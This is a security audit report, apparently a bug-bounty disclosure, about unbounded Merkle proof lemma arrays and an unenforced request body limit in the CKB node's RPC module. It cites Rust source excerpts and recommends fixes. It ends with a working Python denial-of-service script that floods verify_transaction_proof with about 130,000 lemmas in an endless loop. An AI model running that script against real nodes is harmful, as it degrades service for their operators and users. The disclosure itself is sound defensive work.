Audit Report

## Title
Unbounded Attacker-Controlled `lemmas` Array in CBMT Proof Verification Causes Excessive CPU Consumption — (File: `rpc/src/module/chain.rs`)

## Summary
`verify_transaction_proof` and `verify_transaction_and_witness_proof` construct `MerkleProof` objects directly from caller-supplied `indices` and `lemmas` vectors with no application-level size bounds. Each lemma triggers a blake2b hash computation inside `CBMT::retrieve_leaves()` and `merkle_proof.root()`. The configured `max_request_body_size` is never applied to the axum router, removing the only nominal throttle and allowing arbitrarily large payloads to reach the verification logic.

## Finding Description
In `rpc/src/module/chain.rs`, `verify_transaction_proof` constructs a `MerkleProof` directly from caller-supplied data:

```rust
let merkle_proof = MerkleProof::new(
    tx_proof.proof.indices.into_iter().map(|index| index.value()).collect(),
    tx_proof.proof.lemmas.into_iter().map(|lemma| lemma.into()).collect(),
);
``` [1](#0-0) 

This unchecked proof is then passed to `CBMT::retrieve_leaves()` and `merkle_proof.root()`, both of which iterate over every lemma invoking `MergeByte32::merge()` — one blake2b hash per lemma — before returning: [2](#0-1) 

`MergeByte32::merge` allocates a new blake2b context and finalizes it for every single lemma: [3](#0-2) 

`verify_transaction_and_witness_proof` is doubly expensive, constructing and processing two such unchecked proofs per call: [4](#0-3) 

The `max_request_body_size` field exists in the config struct: [5](#0-4) 

However, `start_server` builds the axum router with no `DefaultBodyLimit` layer and never receives or applies the `max_request_body_size` value — confirmed by zero matches for `max_request_body_size` in `rpc/src/server.rs`: [6](#0-5) 

The `handle_jsonrpc` handler receives raw `Bytes` with no size check before deserializing and dispatching: [7](#0-6) 

The `get_tx_indices` helper on the generation path does validate for empty input and duplicates, but the verification path has no analogous guard: [8](#0-7) 

## Impact Explanation
An attacker can submit repeated `verify_transaction_proof` or `verify_transaction_and_witness_proof` requests with maximally large `lemmas` arrays (no body-size limit is enforced). Each request forces the RPC worker thread to perform tens of thousands of blake2b computations before returning `"Invalid transaction proof"`. This degrades RPC availability for all callers sharing the worker pool. The node's consensus and P2P layers are unaffected. This matches the allowed impact: **Note (0–500 points) — local RPC API crash/degradation**, or at most **Low (501–2000 points) — important performance improvement for CKB**, given the localhost-default binding.

## Likelihood Explanation
By default the RPC binds to `127.0.0.1:8114`, limiting the attack to local processes. However, operators frequently expose the RPC to internal networks or the public internet. The attack requires no authentication, no valid transaction, and no on-chain state — only a reachable RPC endpoint and any valid `block_hash` (trivially obtained from `get_tip_header`). The absence of body-size enforcement removes the only nominal throttle. `verify_transaction_and_witness_proof` doubles the cost per call. The attack is trivially repeatable in a tight loop.

## Recommendation
1. **Bound `lemmas` before proof construction.** For a CBMT over `N` leaves, the maximum valid lemma count is `⌈log₂(N)⌉ × indices.len()`. Derive `N` from `block.transactions().len()` and reject any proof exceeding this bound before calling `MerkleProof::new()`.
2. **Enforce `max_request_body_size` in the axum router.** Pass the config value into `start_server` and apply it:
   ```rust
   .layer(DefaultBodyLimit::max(config.max_request_body_size))
   ``` [6](#0-5) 
3. **Apply both fixes to `verify_transaction_and_witness_proof`**, which processes two unchecked proofs per call. [4](#0-3) 

## Proof of Concept
```python
import requests

tip = requests.post("http://127.0.0.1:8114", json={
    "jsonrpc": "2.0", "method": "get_tip_header", "params": [], "id": 0
}).json()
block_hash = tip["result"]["hash"]

lemmas = ["0x" + "aa" * 32] * 130_000  # ~8.8 MB JSON, no body limit enforced

payload = {
    "jsonrpc": "2.0",
    "method": "verify_transaction_proof",
    "params": [{
        "block_hash": block_hash,
        "witnesses_root": "0x" + "00" * 32,
        "proof": {"indices": ["0x0"], "lemmas": lemmas}
    }],
    "id": 1
}

import time
while True:
    t = time.time()
    requests.post("http://127.0.0.1:8114", json=payload)
    print(f"call took {time.time()-t:.2f}s")
```

Each call forces ~130,000 blake2b computations inside `merkle_proof.root()` before returning `"Invalid transaction proof"`. Sustained calls saturate RPC worker threads with no rate limiting or early exit based on the block's actual transaction count.

### Citations

**File:** rpc/src/module/chain.rs (L1948-1961)
```rust
                let merkle_proof = MerkleProof::new(
                    tx_proof
                        .proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
```

**File:** rpc/src/module/chain.rs (L1963-1977)
```rust
                CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
                    .and_then(|tx_hashes| {
                        merkle_proof
                            .root(&tx_hashes)
                            .and_then(|raw_transactions_root| {
                                if block.transactions_root()
                                    == merkle_root(&[raw_transactions_root, witnesses_root])
                                {
                                    Some(tx_hashes.iter().map(|hash| hash.into()).collect())
                                } else {
                                    None
                                }
                            })
                    })
                    .ok_or_else(|| RPCError::invalid_params("Invalid transaction proof"))
```

**File:** rpc/src/module/chain.rs (L2016-2043)
```rust
                let transactions_merkle_proof = MerkleProof::new(
                    tx_proof
                        .transactions_proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .transactions_proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
                let witnesses_merkle_proof = MerkleProof::new(
                    tx_proof
                        .witnesses_proof
                        .indices
                        .into_iter()
                        .map(|index| index.value())
                        .collect(),
                    tx_proof
                        .witnesses_proof
                        .lemmas
                        .into_iter()
                        .map(|lemma| lemma.into())
                        .collect(),
                );
```

**File:** rpc/src/module/chain.rs (L2281-2288)
```rust
    fn get_tx_indices(
        &self,
        tx_hashes: Vec<H256>,
        block_hash: Option<H256>,
    ) -> Result<(core::BlockView, Vec<u32>)> {
        if tx_hashes.is_empty() {
            return Err(RPCError::invalid_params("Empty transaction hashes"));
        }
```

**File:** util/types/src/utilities/merkle_tree.rs (L9-19)
```rust
impl Merge for MergeByte32 {
    type Item = Byte32;
    fn merge(left: &Self::Item, right: &Self::Item) -> Self::Item {
        let mut ret = [0u8; 32];
        let mut blake2b = new_blake2b();

        blake2b.update(left.as_slice());
        blake2b.update(right.as_slice());
        blake2b.finalize(&mut ret);
        ret.into()
    }
```

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-231)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
```
